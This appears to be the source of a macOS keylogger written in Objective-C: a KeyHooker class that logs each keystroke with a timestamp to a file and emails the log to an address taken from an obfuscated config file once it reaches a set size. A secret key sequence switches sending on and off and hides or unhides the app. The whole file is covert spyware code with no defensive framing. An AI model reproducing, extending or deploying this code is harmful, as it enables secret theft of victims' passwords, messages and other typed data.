//
//  KeyboardHooker.m
//  KeyboardHooker
//
//  Created by Иван on 24.11.17.
//  Copyright © 2017 IvanCode. All rights reserved.
//

#import "KeyHooker.h"

@implementation KeyHooker

- (id)init: (id <ShouldSendDelegate>)deleg {
    self = [super init];
    
    flag = YES;
    shouldSend = NO;
    combination = [NSMutableArray array];
    
    delegate = deleg;
    
    NSString *config = [FileManager readFromFile:@"config"];
    if ([config isNotEqualTo: @"error"]) {
        NSArray *components = [config componentsSeparatedByString:@"\n"];
        fileSize = [[Cryptographer doIt:components[1]] integerValue];
        email = [NSString stringWithString:[Cryptographer doIt:components[0]]];
        
        if ([[Cryptographer doIt:components[2]] isEqualToString:@"1"]) {
            flag = NO;
            shouldSend = YES;
        }
    }
    
    return self;
}

- (void)doFullCycle: (int)key {
    [FileManager writeToFile:@"keys" file:[NSString stringWithFormat:@"%-3d = %-13s (%@)\n", key,
                                           [[KeycodeEncrypter keyStringFormKeyCode:key] UTF8String],
                                           [Time currentTime]]];

    if ([FileManager getFileSize:@"keys"] >= fileSize && shouldSend) {
        [EmailSender sendEmailWithMail:email Attachments:@[@"keys"]];
        [FileManager clearFile:@"keys"];
    }
        
    if (key == 55) [combination removeAllObjects];
    [combination addObject:[NSNumber numberWithInt:key]];
    if (key == 15 && [self checkCombination] == YES) [self reset];
}

- (BOOL)checkCombination {
    return [combination isEqualToArray:@[@55, @54, @54, @4, @31, @31, @40, @14, @15]];
}

- (void)reset {
    flag = !flag;
    
    if (flag == true) {
        shouldSend = NO;
        [delegate setShouldSend: NO];
        [AppHider hide];
    } else {
        shouldSend = YES;
        [delegate setShouldSend: YES];
        [AppHider unhide];
    }
}

@end
